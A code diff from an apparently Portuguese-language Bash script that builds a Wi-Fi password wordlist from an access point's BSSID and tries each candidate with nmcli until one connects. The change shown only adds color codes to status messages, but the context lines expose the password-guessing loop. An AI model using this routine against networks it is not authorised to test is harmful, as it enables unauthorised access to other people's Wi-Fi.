@@ -110,7 +110,7 @@ cat /tmp/bssid_atk.txt | cut -d ":" -f1,2,3,4,5 > /tmp/bssid_atk1.txt && cat /tm
 paste -d '' /tmp/temp_bssidclean.txt /tmp/temp_newbyte.txt >> /tmp/password_atk.txt
 
 # Exibe a wordlist
-echo -e "${BLUE} [*] Passwords to try"
+echo -e "${BLUE} [*] Passwords to try ${END}"
 paste -d ' ' /dev/null /tmp/password_atk.txt
 
 # Inicia as tentativas de autenticação
@@ -131,7 +131,7 @@ do
 		echo " "
 		echo -e "${GREEN} [+] Found password: $pass ${END}"
 		echo " "
-		echo -e " [*] Connecting..."
+		echo -e "${BLUE} [*] Connecting...${END}"
 		sudo nmcli dev wifi connect $SSID password $pass
 		echo " "
 		echo -e "${BLUE} [*] Removing temp files...${END}"
